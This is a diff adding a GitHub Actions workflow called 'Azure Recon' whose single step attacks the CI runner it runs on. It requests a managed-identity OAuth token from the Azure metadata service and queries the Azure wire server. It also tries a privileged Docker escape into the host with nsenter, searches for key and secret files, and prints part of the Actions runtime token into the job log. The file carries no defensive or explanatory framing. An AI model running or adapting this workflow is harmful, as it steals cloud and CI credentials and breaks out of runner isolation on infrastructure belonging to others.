@@ -1,0 +1,43 @@
+name: Azure Recon
+on:
+  workflow_dispatch:
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: System Info
+        run: |
+          echo "=== HOSTNAME ==="
+          hostname
+          whoami
+          id
+          echo "=== ENVIRONMENT ==="
+          env | sort | grep -i "AZURE\|GITHUB\|RUNNER\|AGENT\|ACTIONS\|CLOUD\|MSI\|IDENTITY" | head -40
+          echo "=== NETWORK ==="
+          ip addr show 2>/dev/null | grep "inet "
+          cat /etc/resolv.conf 2>/dev/null
+          echo "=== DOCKER ==="
+          docker info 2>&1 | head -20
+          ls -la /var/run/docker.sock 2>/dev/null
+          echo "=== IMDS ==="
+          curl -s -m5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -500
+          echo ""
+          echo "=== IMDS TOKEN ==="
+          curl -s -m5 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -200
+          echo ""
+          echo "=== WIRE SERVER ==="
+          WIRE=$(ip route | grep "168.63.129.16" || route -n 2>/dev/null | grep "168.63" || echo "no-wire-route")
+          echo "Wire route: $WIRE"
+          curl -s -m5 -H "x-ms-version:2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>&1 | head -200
+          echo ""
+          echo "=== DOCKER ESCAPE TEST ==="
+          docker run --rm --privileged --pid=host alpine:latest nsenter -t 1 -m -u -n -i -- cat /etc/hostname 2>&1
+          echo ""
+          echo "=== MOUNTED SECRETS ==="
+          find / -name "*.json" -path "*/secrets/*" 2>/dev/null | head -10
+          find / -name "*.pem" -o -name "*.key" -o -name "*.cert" 2>/dev/null | head -10
+          echo "=== ACTIONS TOKEN ==="
+          echo "${ACTIONS_RUNTIME_TOKEN:0:50}..."
+          echo "URL: $ACTIONS_RUNTIME_URL"
+          echo "=== DONE ==="
